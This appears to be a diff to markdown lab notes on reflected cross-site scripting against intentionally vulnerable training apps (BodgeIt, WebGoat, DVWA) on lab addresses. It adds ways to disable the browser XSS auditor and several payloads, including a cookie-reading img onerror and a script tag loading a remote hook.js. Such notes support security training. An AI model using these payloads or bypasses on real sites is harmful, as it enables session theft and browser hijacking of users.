@@ -4,13 +4,27 @@
 ## Refelcted
 
 Got `ERR_BLOCKED_BY_XSS_AUDITOR` in your Chrome ? Try the `Iceweasel` in the VM ;]
+Or just set `X-XSS-Protection: 0` in burp via `Proxy > Options > Match and Replace`
+Or run Chrome/Chromium with `--disable-xss-auditor`
 
+### BodgeIt store
 
 `http://10.6.6.13:8080/bodgeit/search.jsp?q=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E`
 
 `http://10.6.6.13:8080/bodgeit/search.jsp?q=<sCrIpt src='http://10.6.6.13:3000/hook.js'></ScRipT>`
 
 [Reflected XSS in WebGoat](http://10.6.6.10:8080/WebGoat-5.4/attack?Screen=20&menu=900)
+
+
+### DVWA
+Try it on `http://owasp.local/dvwa/vulnerabilities/xss_r`
+
+GET `http://owasp.local/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E#`
+
+```
+<script>alert("XSS");</script>
+<img src=x onerror=alert(document.cookie)>
+```
 
 ## Stored
 
